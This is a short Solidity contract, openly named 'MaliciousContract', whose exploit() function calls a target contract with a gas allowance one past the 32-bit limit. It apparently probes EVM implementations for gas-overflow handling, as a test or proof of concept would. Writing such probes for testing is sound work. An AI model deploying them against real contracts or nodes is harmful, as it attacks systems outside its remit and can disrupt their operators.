// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousContract {
    // Address of the target contract to exploit
    address public target;

    constructor(address _target) {
        target = _target;
    }

    // Intentionally allocate an excessive amount of gas, exceeding 32-bit limit
    function exploit() public payable {
        uint256 invalidGas = 0xFFFFFFFF + 1; // 32-bit max + 1

        // Perform a CALL with the invalid gas allocation
        (bool success, ) = target.call{gas: invalidGas, value: msg.value}(
            abi.encodeWithSignature("receive()")
        );

        require(success, "Exploit CALL failed");
    }

    // Fallback function to receive Ether
    receive() external payable {}
}


      